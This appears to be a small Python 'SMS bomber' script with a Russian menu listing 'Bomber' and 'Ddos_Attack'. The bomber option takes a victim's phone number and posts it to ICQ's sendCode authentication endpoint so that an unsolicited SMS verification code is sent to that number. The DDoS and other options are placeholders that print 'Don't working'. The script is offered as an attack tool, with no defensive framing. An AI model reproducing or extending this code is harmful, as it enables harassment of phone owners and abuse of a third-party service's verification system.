import requests

print("          ______________")
print("         / _____  ____  |")
print("        / /    / /    | |")
print("        | |    | |    | |")
print("        | |    | |    | |")
print("        | |    | |    | |")
print("        |_|    |_|    |_| \n")

print("1. Bomber     2.Ddos_Attack     3.Idk    4.Idk   5.Idk \n")

l = int(input("Выберите число: "))

if l == 1:
    ll = int(input("Введите номер: "))

    def icq(phone):
        try:
            url = 'https://u.icq.net/api/v70/rapi/auth/sendCode'
            payload = {
                "reqId": "94446-1645359697",
                "params": {
                    "phone": str(phone),
                    "language": "ru-RU",
                    "route": "sms",
                    "devId": "iclrtwz1s1Hj100r",
                    "application": "icq"
                }
            }
            a = requests.post(url, json=payload)
            print(a.text)
        except Exception as e:
            print(e)

    icq(ll)


if l == 2:
    print("Don't working")

if l == 3:
    print("Don`t working")

if l == 4:
     print("Don`t working")

if l == 5:
    print("Don`t working")
